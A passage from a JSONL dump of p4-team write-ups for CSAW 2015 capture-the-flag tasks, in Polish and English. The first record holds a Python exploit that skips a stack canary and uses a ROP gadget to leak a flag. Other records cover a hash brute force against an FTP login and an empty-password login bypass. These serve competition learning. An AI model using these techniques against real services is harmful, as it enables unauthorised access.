0x84\\n\", count);\n\n    if (0 == --count)\n         return 0;\n\n    for (i = 0; i < count; ++i)\n         localbuf[i] ^= buf[i];\n\n    func_array[localbuf[0]](localbuf+1, count);\n    return 0;\n}\n```\n\nOd razu widać że łatwo wywołać przepełnienie bufora, ale niestety - stos jest chroniony kanarkami więc nie będzie tak łatwo.\n\nW kodzie widać też nieużywaną nigdzie funkcję socksend która wysyła podany w argumencie bufor do podanego w argumencie socketa.\n\nPo chwili zastanowienia dochodzimy do wniosku że możemy pominąć kanarka po prostu xorując go z zerami. Następnie jedyne co musimy zrobić, to nadpisać adres powrotu w odpowiedni sposób, tak żeby wywołać funkcję socksend z parametrami socksend(fd, password, BUF_SIZE) (w ten sposób program sam wyśle do nas flagę).\n\nNiestety nie jest tak prosto, na stosie nie ma wystarczająco wiele miejsca żeby zmieścic argumenty dla funkcji socksend (po nadpisaniu zmiennej 'counter' kończy się wykonanie funkcji). Ale jeśli postaramy się, możemy przeskoczyć do ramki funkcji niżej. Używamy do tego następującego gadgetu:\n\n```\ngadget_pop:\nadd     esp, 0Ch    ; pominięcie 3 elementów na stosie\npop     ebx         ; zdjęcie elementu ze stosu (i zapisanie do ebx)\npop     esi         ; zdjęcie elementu ze stosu (i zapisanie do esi)\npop     edi         ; zdjęcie elementu ze stosu (i zapisanie do edi)\npop     ebp         ; zdjęcie elementu ze stosu (i zapisanie do ebp)\nretn                ; zdjęcie elementu ze stosu i skoczenie od niego\n```\n\nKtóry zdejmuje 7 elementów ze stosu, i skacze pod 8.\n\nWięc ostateczny plan jest taki: skaczemy pod ten gadget, on zdejmuje odpowiednią ilość parametrów ze stosu, wtedy wykonanie trafia na początek naszego czystego, niexorowanego bufora w pamięci i możmy zrobić co tylko chcemy.\n\nDocelowo stos będzie wyglądał tak:\n\n![](./shellcode.png)\n\nSkrypt którego użyliśmy :o wygenerowania shellcodu i wysłania go do programu:\n\n```\n# -*- coding: utf-8 -*-\nimport struct, socket\n\nHOST = '54.152.37.20'\nPORT = 24242\n\ns = socket.socket()\ns.connect((HOST, PORT))\n\n# oryginalny adres powrotu na stosie\nfirst_return_addr = 0x08056AFA\n# placeholder na zmienne których zawartość jest nieważna\nplaceholder = 'xxxx'\n\ngadget_pop_xor = struct.pack('<I', 0x080578f5 ^ first_return_addr)\npassword_addr = struct.pack('<I', 0x0805F0C0)\nsocksend_addr = struct.pack('<I', 0x0804884B)\nexit_addr = struct.pack('<I', 0x08048670)\n\ndef get_payload(counter):\n    # xorujemy z 1, bo chcemy żeby counter przyjął 1\n    counter_xor = struct.pack('<I', counter ^ 1)\n    # składamy payload\n    return (\n            # adres funkcji socksend (znany)\n            socksend_addr\n            # adres powrotu z funkcji socksend do exit\n            + exit_addr\n            # deskryptor dla socksend (przewidywana wartość)\n            + struct.pack('<I', 4)\n            # adres zmiennej globalnej password dla socksend\n            + password_addr\n            # ilość bajtów do przeczytania dla socksend\n            + struct.pack('<I', 256)\n            # wolne miejsce na stosie (niezajęta część bufora)\n            + placeholder * 39\n            # xorowane z kanarkiem\n            + '\\0\\0\\0\\0'\n            # puste miejsce na stosie\n            + placeholder * 3\n            # podmieniamy adres powrotu na gadget_pop\n            + gadget_pop_xor\n            # xorowane z niepotrzebnym już argumentem z adresem bufora\n            + placeholder\n            # zerowanie countera\n            + counter_xor\n            )\n\n# zmierzenie długości payloadu\npayload_length = len(get_payload(123))\n# i stworzenie ostatecznego payloadu\npayload = get_payload(payload_length - 1)\ns.send(payload)\nprint s.recv(99999)\n```\n\nI udaje się - skrypt który napisaliśmy zadziałał. Zdobyliśmy w ten sposób upragnioną flagę:\n    cc21fe41b44ba70d0e6978c840698601\n", "timestamp": "2025-10-21T22:03:00.725383"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/re_200_hacking_time/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/re_200_hacking_time/README.md", "content": "## Hacking Time (re, 200p, 180 solves)\n\n### PL\n[ENG](#eng-version)\n\n> We’re getting a transmission from someone in the past, find out what he wants.  \n> [HackingTime.nes](HackingTime.nes)\n\nPobieramy udostępniony plik, który okazuje się obrazem aplikacji na Nintendo Entertainment System, 8-bitową konsolę, którą każdy zna i lubi :). Zadanie polega na podaniu hasła, które jednocześnie będzie flagą w tym zadaniu.\n\nZamiast statycznie analizować to zadanie, spróbujemy rozwiązać je \"na żywo\" w emulatorze FCEUX z jego zintegrowanym debuggerem. Krótka eksperymentacja pozwala nam stwierdzić, że sprawdzenie hasła oprócz zmiany samego bufora z hasłem w pamięci modyfikuje nam również bajty od offsetu `0x1e`.\n\n![](./memory.png)\n\nUstawiamy w takim razie read breakpoint na tym adresie i przy ponownej próbie sprawdzenia hasła trafiamy na następujący fragment:\n\n```gas\n 00:8337:A0 00     LDY #$00\n>00:8339:B9 1E 00  LDA $001E,Y @ $001E = #$80\n 00:833C:D0 08     BNE $8346\n 00:833E:C8        INY\n 00:833F:C0 18     CPY #$18\n 00:8341:D0 F6     BNE $8339\n 00:8343:A9 01     LDA #$01\n 00:8345:60        RTS -----------------------------------------\n 00:8346:A9 00     LDA #$00\n 00:8348:60        RTS -----------------------------------------\n ```\n\nJest to pętla, która sprawdza nam `0x18` znaków zaczynając od naszego offsetu `0x1e`. Jeżeli któryś z bajtów nie wynosi 0 to funkcja wychodzi z wartością 0, a w przeciwnym wypadku z 1. Bezpośrednia zmiana IP na instrukcję spod `0x8343` i wznowienie programu potwierdza nam komunikatem o sukcesie, że to jest celem zadania. Musimy zatem wprowadzić takie hasło by bajty spod offsetu `0x1e` wynosiły same zera. Możemy dokonać statycznej analizy albo literka po literce zbruteforce'ować nasze hasło (a to dzięki temu, że zmiana następnych liter nie zmienia nam bajtów poprzednich). Postanowiliśmy skorzystać z tej drugiej metody.\n\nHasłem oraz flagą okazał się ciąg: `NOHACK4UXWRATHOFKFUHRERX`. Cała aplikacja jest oczywiście zabawnym nawiązaniem do filmu \"Kung Fury\" :)!\n\n### ENG version\n\n> We’re getting a transmission from someone in the past, find out what he wants.  \n> [HackingTime.nes](HackingTime.nes)\n\nWe download the file, which turns out to be a image of an application for Nintendo Entertainment System, 8-bit console which everyone knows and likes :). The task was to get the password, which is also a flag.\n\n\nInstead of doing a static code analysis, we try to solve it \"live\" in FCEUX emulator with integrated debugger. Short experimentation enables us to notice that password check, apart from changing the password buffer itself, modified also some bytes from offset `0x1e`.\n\n![](./memory.png)\n\nSo we place a read breakpoint at this address and at the next password check we find this fragment:\n\n```gas\n 00:8337:A0 00     LDY #$00\n>00:8339:B9 1E 00  LDA $001E,Y @ $001E = #$80\n 00:833C:D0 08     BNE $8346\n 00:833E:C8        INY\n 00:833F:C0 18     CPY #$18\n 00:8341:D0 F6     BNE $8339\n 00:8343:A9 01     LDA #$01\n 00:8345:60        RTS -----------------------------------------\n 00:8346:A9 00     LDA #$00\n 00:8348:60        RTS -----------------------------------------\n ```\n\nIt's a loop which checks `0x18` characters starting with the offset `0x1e`. If any of the bytes is not 0 the function returns with 0, otherwise it returns with 1. Changing IP manually for the instruction at `0x8343` and resuming the execution ensures us with a success dialog that this is the point of the task. We have to put there a password so that bytes from offset `0x1e` are all zeroes. We could do a static code analysis or try to brute force the password character by character (mostly because changing next characters does not affect previous bytes). We decided to do the latter.\n\nThe password and the flag was `NOHACK4UXWRATHOFKFUHRERX`. Whole application is, of course, connected with the movie \"Kung Fury\" :)!", "timestamp": "2025-10-21T22:03:01.064940"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/re_300_ftp/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/re_300_ftp/README.md", "content": "## FTP (re, 300p, 214 solves)\n\n> We found an ftp service, I'm sure there's some way to log on to it.\n> \n> nc 54.172.10.117 12012\n> [ftp_0319deb1c1c033af28613c57da686aa7](ftp)\n\n### PL Version\n`for ENG version scroll down`\n\nPobieramy zalinkowany plik i ładujemy do IDY. Jest to faktycznie, zgodnie z opisem, serwer FTP.\n\nW stringach znajdujących się w binarce znajdujemy napis zawierający wszystkie komendy wspierane przez serwer (w helpie):\n\n> USER PASS PASV PORT\n> NOOP REIN LIST SYST SIZE\n> RETR STOR PWD CWD\n\nPrzeglądamy chwilę funkcje znajdujące się w binarce, i najciekawsza wydaje sie ta odpowiadająca \"nieudokumentowanej\" funkcji RDF:\n\n    mov     [rbp+ptr], rax\n    mov     esi, offset aR  ; \"r\"\n    mov     edi, offset filename ; \"re_solution.txt\"\n    call    _fopen\n    ; (...)\n    mov     rdx, [rbp+stream]\n    mov     rax, [rbp+ptr]\n    mov     rcx, rdx        ; stream\n    mov     edx, 1          ; n\n    mov     esi, 28h        ; size\n    mov     rdi, rax        ; ptr\n    call    _fread\n    mov     rax, [rbp+var_18]\n    mov     eax, [rax]\n    mov     rdx, [rbp+ptr]\n    mov     rsi, rdx\n    mov     edi, eax\n    call    send_string_to_client\n\nNiestety, wywołanie tej funkcji wymaga autentykacji do systemu. Patrzymy więc na funkcje odpowiadającą za zalogowanie.\n\nWygląda ona mniej więcej tak (po ręcznym przepisaniu do C)\n\n    unsigned hash(char *txt)\n    {\n      int v = 5381;\n      for (int i = 0; txt[i]; ++i )\n        v = 33 * v + txt[i];\n      return (unsigned)v;\n    }\n\n    bool login_ok(char *username, char *password) {\n         return strcmp(username, \"blankwall\") == 0 && hash(password) == 3548828169;\n    }\n\n(A przynajmniej to ważne fragmenty z tej funkcji, samo wczytywanie i wysyłanie tekstu do klienta pominęliśmy).\n\nFunkcja hashująca jest jak widać bardzo prosta, więc można było spróbować ją złamać. I nie byłoby to bardzo trudne, ale poszliśmy prostszą drogą - zauważyliśmy że jest \"monotoniczna\" (czyli każdy kolejny znak w haśle ma coraz mniejszy wpływ na wynik hasha, czyli możemy zgadywać hasło znak po znaku). Napisaliśmy do tego narzędzie:\n\n    int main(int argc, char *argv[]) {\n        char c[1000];\n        puts(\"3548828169\");\n        unsigned rzecz = rzeczy(argv[1]); \n        printf(\"%u\\n\", rzecz);\n        if (rzecz > 3548828169) {\n            puts(\"2much\");\n        } else if (rzecz < 3548828169) {\n            puts(\"2low\");\n        } else {\n            puts(\"just enough\");\n        }\n    }\n\nPrzykładowa interakcja z programem (z komentarzami):\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Taaaaa\n    3548828169\n    3538058430\n    2low    (czyli `Ta` to za niski prefiks)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tlaaaa\n    3548828169\n    3551103561\n    2much    (czyli `Tl` to za wysoki prefiks)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tkaaaa\n    3548828169\n    3549917640\n    2much    (czyli `Tk` to za wysoki prefiks)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tjaaaa\n    3548828169\n    3548731719\n    2low     (czyli `Tj` to za niski prefiks)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe TkCaaa\n    3548828169\n    3548839530\n    2much    (czyli `Tk` jednak było ok, teraz próbujemy zmniejszyć trzeci znak)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe TkBaaa\n    3548828169\n    3548803593\n    2low     (czyli `TkC` jest dobrym strzałem, bo `TkCa` jest za wysokie, `TkBa` już jest za niskie)\n    \n    (itd, itd)\n    \nW ten sposób trafiamy na hasło - TkCWRy. Przy wpisywaniu go do nc trzeba pamiętać żeby zakończyć wpisywanie za pomocą C-d zamiast entera, bo inaczej hash liczy się ze znakiem nowej linii i wychodzi błędny.\n\nWięc mamy hasło i usera, wystarczy wykonać komendę pobierającą flagę:\n\n    $ nc -vv 54.172.10.117 12012\n    Connection to 54.172.10.117 12012 port [tcp/*] succeeded!\n    Welcome to FTP server\n    USER blankwall\n    Please send password for user blankwall\n    PASS TkCWRylogged in\n    RDF\n    flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}\n\nGotowe.\n\n### ENG Version\n\nWe download linked file and we load it with IDA. It is, in fact, a FTP server, just as described.\n\nIn the strings in the binary we find all the commands supported by server (in help):\n\n> USER PASS PASV PORT\n> NOOP REIN LIST SYST SIZE\n> RETR STOR PWD CWD\n\nWe look around the functions in the binary and the most interesting one seems to be the \"undocumented\" RDF function:\n\n    mov     [rbp+ptr], rax\n    mov     esi, offset aR  ; \"r\"\n    mov     edi, offset filename ; \"re_solution.txt\"\n    call    _fopen\n    ; (...)\n    mov     rdx, [rbp+stream]\n    mov     rax, [rbp+ptr]\n    mov     rcx, rdx        ; stream\n    mov     edx, 1          ; n\n    mov     esi, 28h        ; size\n    mov     rdi, rax        ; ptr\n    call    _fread\n    mov     rax, [rbp+var_18]\n    mov     eax, [rax]\n    mov     rdx, [rbp+ptr]\n    mov     rsi, rdx\n    mov     edi, eax\n    call    send_string_to_client\n\nUnfortunately, calling this function requires authentication. Therefore we check the login function.\nIt looks like this (after re-writing it to C):\n\n    unsigned hash(char *txt)\n    {\n      int v = 5381;\n      for (int i = 0; txt[i]; ++i )\n        v = 33 * v + txt[i];\n      return (unsigned)v;\n    }\n\n    bool login_ok(char *username, char *password) {\n         return strcmp(username, \"blankwall\") == 0 && hash(password) == 3548828169;\n    }\n\n(Those are at lest the important parts, without the I/O operations).\n\nAs can be seen the hash function is very simple so we could try to break it. It would not be very difficult, however we decided to take an even easier path - we noticed that the hash function is \"monotonic\" (every next character in the password has smaller influence on the ouput hash, so we can guess the password character by character). We prepared a tool for this:\n\n    int main(int argc, char *argv[]) {\n        char c[1000];\n        puts(\"3548828169\");\n        unsigned rzecz = rzeczy(argv[1]); \n        printf(\"%u\\n\", rzecz);\n        if (rzecz > 3548828169) {\n            puts(\"2much\");\n        } else if (rzecz < 3548828169) {\n            puts(\"2low\");\n        } else {\n            puts(\"just enough\");\n        }\n    }\n\nAn example of interaction with the script (with comments):\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Taaaaa\n    3548828169\n    3538058430\n    2low    (so `Ta` is too low for a prefix)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tlaaaa\n    3548828169\n    3551103561\n    2much    (so `Tl` is too high for a prefix)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tkaaaa\n    3548828169\n    3549917640\n    2much    (so `Tk` is too high for a prefix)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe Tjaaaa\n    3548828169\n    3548731719\n    2low    (so `Tj` is too low for a prefix)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe TkCaaa\n    3548828169\n    3548839530\n    2much    (so `Tk` was in fact OK, so now we try to lower the third character)\n    \n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/pwn_300_ftp\n    $ ./a.exe TkBaaa\n    3548828169\n    3548803593\n    2low     (so `TkC` is a good guess, since `TkCa` is too high and `TkBa` is too low)\n    \n    (etc, etc)\n    \nThis was we get the password - TkCWRy. It's worth noting to provide the input via nc and end it with C-d instead of Enter, otherwise the hash will include newline character and we get a wrong password.\n\nSo we have a password and username, we just need to issue a command to get the flag:\n\n    $ nc -vv 54.172.10.117 12012\n    Connection to 54.172.10.117 12012 port [tcp/*] succeeded!\n    Welcome to FTP server\n    USER blankwall\n    Please send password for user blankwall\n    PASS TkCWRylogged in\n    RDF\n    flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}\n\nDone.\n", "timestamp": "2025-10-21T22:03:01.416141"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/re_500_wyvern/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/re_500_wyvern/README.md", "content": "## wyvern (re, 500p, 96 solves)\n\n### PL Version\n`for ENG version scroll down`\n\nTo zadanie prawdopodobnie byłoby bardzo trudne do zrobienia \"klasycznie\" (w końcu 500 punktów), ale nam udało się je zrobić bardzo szybko za pomocą statycznej analizy (i odrobiny intuicji, a.k.a. zgadywania).\n\nOtwieramy [binarkę](wyvern), i wita nas ściana kodu napisanego w C++ (tzn. ściana asemblera, która pewnie powstała ze średniej ilości kodu napisanego w C++ z szablonami, ale tak czy inaczej dość przytłaczająca). Zamiast zabierać się na ślepo do analizy krok po kroku przeglądamy kod statycznie, i znajdujemy ciekawy fragment:\n\n    secret_100      dd 64h \n    secret_214      dd 0D6h\n    secret_266      dd 10Ah\n    secret_369      dd 171h\n    secret_417      dd 1A1h\n    secret_527      dd 20Fh\n    secret_622      dd 26Eh\n    secret_733      dd 2DDh\n    secret_847      dd 34Fh\n    secret_942      dd 3AEh\n    secret_1054     dd 41Eh\n    secret_1106     dd 452h\n    secret_1222     dd 4C6h\n    secret_1336     dd 538h\n    secret_1441     dd 5A1h\n    secret_1540     dd 604h\n    secret_1589     dd 635h\n    secret_1686     dd 696h\n    secret_1796     dd 704h\n    secret_1891     dd 763h\n    secret_1996     dd 7CCh\n    secret_2112     dd 840h\n    secret_2165     dd 875h\n    secret_2260     dd 8D4h\n    secret_2336     dd 920h\n    secret_2412     dd 96Ch\n    secret_2498     dd 9C2h\n\nCo w nim takiego ciekawego? No więc mamy trochę liczb, ułożonych rosnąco. Pierwsza liczba < 0x80, i każda kolejna jest większa od poprzedniej o mniej niż 0x80.\n\nA gdyby tak zrobić ślepy strzał i sprawdzić narzucającą się rzecz?:\n\n    >>> nums = [\n    ...     0x64, 0x0D6, 0x10A, 0x171, 0x1A1, 0x20F, 0x26E, 0x2DD,\n    ...     0x34F, 0x3AE, 0x41E, 0x452, 0x4C6, 0x538, 0x5A1, 0x604,\n    ...     0x635, 0x696, 0x704, 0x763, 0x7CC, 0x840, 0x875, 0x8D4,\n    ...     0x920, 0x96C, 0x9C2, 0xA0F\n    ... ]\n    >>> print ''.join(chr(b - a) for a, b in zip([0] + nums, nums))\n    dr4g0n_or_p4tric1an_it5_LLVM\n\nSzybko poszło, jesteśmy 500 punktów do przodu\n\n### ENG Version\n\nThis task would probably be very hard to solve in the \"classic\" way (after all it was 500 points), but we managed to solve it very quickly using only static code analysis (and some intuition and guessing).\n\nWe open the [binary](wyvern) and we are faced with a wall of C++ code (technically with a wall of assembly code which came from a modest C++ templates code, but still it was overwhelming). Instead of trying to analyse the code blindly step-by-step, we start with some static analysis and we find an interesting thing:\n\n    secret_100      dd 64h \n    secret_214      dd 0D6h\n    secret_266      dd 10Ah\n    secret_369      dd 171h\n    secret_417      dd 1A1h\n    secret_527      dd 20Fh\n    secret_622      dd 26Eh\n    secret_733      dd 2DDh\n    secret_847      dd 34Fh\n    secret_942      dd 3AEh\n    secret_1054     dd 41Eh\n    secret_1106     dd 452h\n    secret_1222     dd 4C6h\n    secret_1336     dd 538h\n    secret_1441     dd 5A1h\n    secret_1540     dd 604h\n    secret_1589     dd 635h\n    secret_1686     dd 696h\n    secret_1796     dd 704h\n    secret_1891     dd 763h\n    secret_1996     dd 7CCh\n    secret_2112     dd 840h\n    secret_2165     dd 875h\n    secret_2260     dd 8D4h\n    secret_2336     dd 920h\n    secret_2412     dd 96Ch\n    secret_2498     dd 9C2h\n\nWhat is so interesting? Well we have some numbers, in ascending oerder. With number < 0x80 and every next one is bigger from previous by less than 0x80.\n\nWhat if we tried a shot in the dark and check what seems to stick out?:\n\n    >>> nums = [\n    ...     0x64, 0x0D6, 0x10A, 0x171, 0x1A1, 0x20F, 0x26E, 0x2DD,\n    ...     0x34F, 0x3AE, 0x41E, 0x452, 0x4C6, 0x538, 0x5A1, 0x604,\n    ...     0x635, 0x696, 0x704, 0x763, 0x7CC, 0x840, 0x875, 0x8D4,\n    ...     0x920, 0x96C, 0x9C2, 0xA0F\n    ... ]\n    >>> print ''.join(chr(b - a) for a, b in zip([0] + nums, nums))\n    dr4g0n_or_p4tric1an_it5_LLVM\n\nWell that was fast, and we are 500 points up.\n\n", "timestamp": "2025-10-21T22:03:01.773360"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/recon_100_alexander_taylor/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/recon_100_alexander_taylor/README.md", "content": "## Alexander Taylor (recon, 100p, 424 solves)\n\n### PL Version\n`for ENG version scroll down`\n\nDostajemy link od którego możemy wystartować `http://fuzyll.com/csaw2015/start`\nPod linkiem jest pierwsza zagadka:\n\n`CSAW 2015 FUZYLL RECON PART 1 OF ?: Oh, good, you can use HTTP! The next part is at /csaw2015/<the acronym for my university's hacking club>.`\n\nOdszukujemy informacje o uczelni Alexandra Taylora na podstawie jego profilu na linkedin i jest to University of South Florida. Sprawdzamy jak nazywa się klub komputerowy tej uczelni i URL jego strony zaczyna sie od `wcsc`\nPrzechodzimy więc do `http://fuzyll.com/csaw2015/wcsc` i dostajemy kolejną zagadkę:\n\n`CSAW 2015 FUZYLL RECON PART 2 OF ?: TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg==`\n\nJuż na pierwszy rzut oka widać że jest to Base64, które po zdekodowaniu daje nam kolejną zagadkę:\n\n`Nice work! The next part is at /csaw2015/<my super smash brothers main>.`\n\nChwila spędzona w google pozwala nam znaleźć filmiki na youtube gdzie postać użytkownika `fuzyll` (a taki nick ma Alexander Taylor) walczy z innymi graczami. Jego postać to Yoshi, przechodzimy więc do:\n\n`http://fuzyll.com/csaw2015/yoshi`\n\nGdzie dostajemy z serwera png z yoshim:\n\n![](./yoshi.png)\n\nAnaliza tego png pozwala nam znaleźć w środku kolejną zagadkę:\n\n`SAW 2015 FUZYLL RECON PART 3 OF ?: Isn't Yoshi the best?! The next egg in your hunt can be found at /csaw2015/<the cryptosystem I had to break in my first defcon qualifier`\n\nDalsza część poszukiwań doprowadza nas for informacji że do złamania była `Enigma`. Podążamy więc dalej:\n\n`http://fuzyll.com/csaw2015/enigma`\n\nGdzie czeka na nas kolejna zagadka:\n\n```\nCSAW 2015 FUZYLL RECON PART 4 OF 5: Okay, okay. This isn't Engima, but the next location was \"encrypted\" with the JavaScript below: Pla$ja|p$wpkt$kj$}kqv$uqawp$mw>$+gwes6451+pla}[waa[ia[vkhhmj\n\nvar s = \"THIS IS THE INPUT\"\nvar c = \"\"\nfor (i = 0; i < s.length; i++) {\n    c += String.fromCharCode((s[i]).charCodeAt(0) ^ 0x4);\n}\nconsole.log(c);\n```\n\nJak nie trudno zauważyć funkcja \"szyfrująca\" korzysta jedynie z operacji XOR na stałym kluczu więc do jej odwrócenia wystarczy wykonać identyczną operację po raz drugi. W ten sposób uzyskujemy: `they_see_me_rollin` i przechodzimy do:\n\n`http://fuzyll.com/csaw2015/they_see_me_rollin`\n\nGdzie znajduje się poszukiwana przez nas flaga:\n\n`CSAW 2015 FUZYLL RECON PART 5 OF 5: Congratulations! Here's your flag{I_S3ARCH3D_HI6H_4ND_L0W_4ND_4LL_I_F0UND_W4S_TH1S_L0USY_FL4G}!`\n\n\n### ENG Version\n\nWe get a link to start with: `http://fuzyll.com/csaw2015/start`\nThere we can find the first riddle:\n\n`CSAW 2015 FUZYLL RECON PART 1 OF ?: Oh, good, you can use HTTP! The next part is at /csaw2015/<the acronym for my university's hacking club>.`\n\nWe check Alexander Taylor's university on his linkedin profile and we learn it's University of South Florida. We look for the computer club and its website address starts with `wcsc`.\nWe go to `http://fuzyll.com/csaw2015/wcsc` where we get another riddle:\n\n`CSAW 2015 FUZYLL RECON PART 2 OF ?: TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg==`\n\nAt first glance it looks like a `base64` encoding, which decoded gives us another riddle:\n\n`Nice work! The next part is at /csaw2015/<my super smash brothers main>.`\n\nA while spent with google lets us find some youtube videos where a super smash bros character \"fuzyll\" (and this is Alexander Taylor's nick) is fighting some other players. His character is `yoshi` so we go to:\n\n`http://fuzyll.com/csaw2015/yoshi`\n\nWhere we get a png with yoshi picture. \n\n![](./yoshi.png)\n\nQuick analysis of this png file lets us find another clue:\n\n`SAW 2015 FUZYLL RECON PART 3 OF ?: Isn't Yoshi the best?! The next egg in your hunt can be found at /csaw2015/<the cryptosystem I had to break in my first defcon qualifier`\n\nSome googling later we find out that it was `Enigma` so we go to:\n\n`http://fuzyll.com/csaw2015/enigma`\n\nWhere another riddle is waiting:\n\n```\nCSAW 2015 FUZYLL RECON PART 4 OF 5: Okay, okay. This isn't Engima, but the next location was \"encrypted\" with the JavaScript below: Pla$ja|p$wpkt$kj$}kqv$uqawp$mw>$+gwes6451+pla}[waa[ia[vkhhmj\n\nvar s = \"THIS IS THE INPUT\"\nvar c = \"\"\nfor (i = 0; i < s.length; i++) {\n    c += String.fromCharCode((s[i]).charCodeAt(0) ^ 0x4);\n}\nconsole.log(c);\n```\n\nAs can be easily seen the encryption function is a simple XOR with static key and therefore it can be decoded by applying the same operation again. This gives us decoded message: `they_see_me_rollin` so we go to:\n\n`http://fuzyll.com/csaw2015/they_see_me_rollin`\n\nWhere a flag is waiting for us:\n\n`CSAW 2015 FUZYLL RECON PART 5 OF 5: Congratulations! Here's your flag{I_S3ARCH3D_HI6H_4ND_L0W_4ND_4LL_I_F0UND_W4S_TH1S_L0USY_FL4G}!`", "timestamp": "2025-10-21T22:03:02.022105"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/recon_100_julian_cohen/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/recon_100_julian_cohen/README.md", "content": "## Julian Cohen (recon, 100p, 883 solves)\n\n### PL Version\n`for ENG version scroll down`\n\nBardzo krótkie zadanie. Wyszukiwanie Juliana Cohena, zawężone do tematyki CTFów pozwala bardzo szybo trafić na jego twittera (@HockeyInJune) gdzie wprost umieścił flagę w jednym z wpisów `https://twitter.com/HockeyInJune/status/641716034068684800`\n\n![](./1.PNG)\n\n`flag{f7da7636727524d8681ab0d2a072d663}`\n\n### ENG Version\n\nVery short challenge. Searching for Julian Cohen, filtered for CTF quickly gave us his twitter account (@HockeyInJune) where he plainly placed the flag in one of the posts: `https://twitter.com/HockeyInJune/status/641716034068684800`\n\n![](./1.PNG)\n\n`flag{f7da7636727524d8681ab0d2a072d663}`", "timestamp": "2025-10-21T22:03:02.249182"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/trivia_10_black_hat/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/trivia_10_black_hat/README.md", "content": "## Math aside, we're all black hats Now(trivia, 10p, 551 solves)\n\n`This Pentesting expert supplied HBO's Silicon Valley with technical advice in season 2. The flag is his twitter handle.`\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na znalezieniu loginu na twitterze pentestera który pracował jako doradca przy 2 sezonie serialu Silicon Valley.\nChwila googlowania pozwala dowiedzieć się że jest to `Rob Fuller` więc flaga to `mubix`\n\n### ENG Version\n\nThe task was to find a twitter handle of a real pentester who was advising Silicon Valley cast for the second season of the show.\nA little googling was needed to find that it was `Rob Fuller` and thus the flag is `mubix`", "timestamp": "2025-10-21T22:03:02.584195"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/trivia_trivia_1/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/trivia_trivia_1/README.md", "content": "Trivia 1 (trivia, 10p, 729 solves)\n\n> This family of malware has gained notoriety after anti-virus and threat intelligence companies claimed that it was being used by several Chinese military groups.\n\nPlugX\n", "timestamp": "2025-10-21T22:03:02.941439"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/web_200_lawn_care_simulator/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/web_200_lawn_care_simulator/README.md", "content": "## Lawn Care Simulator (web, 200p, 450 solves)\n`http://54.165.252.74:8089/`\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na zalogowaniu się do konta premium w internetowym symulatorze hodowania trawy.\nStandardowe próby wykonania SQL Injection na polach formularza nie przyniosły efektów, ale pozwoliły zaobserwować, że dane wpisane w pole z hasłem są hashowane po stronie przeglądarki jeszcze przed wysłaniem. \n\n![](./1.png)\n\nZajęliśmy się więc podmienianiem parametrów w formularzu po operacji hashowania. Co prawda pole z hasłem po stronie przeglądarki było sprawdzane aby upewnić się że nie jest puste, ale za pomocą Tamper Data sprawdziliśmy co się stanie jeśli wyślemy puste hasło dla losowego użytkownika...\n\n![](./2.png)\n\nTym samym zupełnie przypadkiem ominęliśmy praktycznie wszystkie pułapki zastawione przez autorów zadania i nie musieliśmy poświęcać cennego czasu na analizę kodu strony (do którego można było uzyskać dostęp poprzez link w źródle strony). Późniejsza analiza pozwoliła stwierdzić, że przypadkiem wykorzystaliśmy faktyczną lukę w skrypcie, nie tą zamierzoną przez autorów zadania :)\n\n\n### ENG Version\n\nThe task was to log-in on a premium account in an internet lawn care simulator.\nStandard approach with SQLInjection on form fields yielded no results, however we 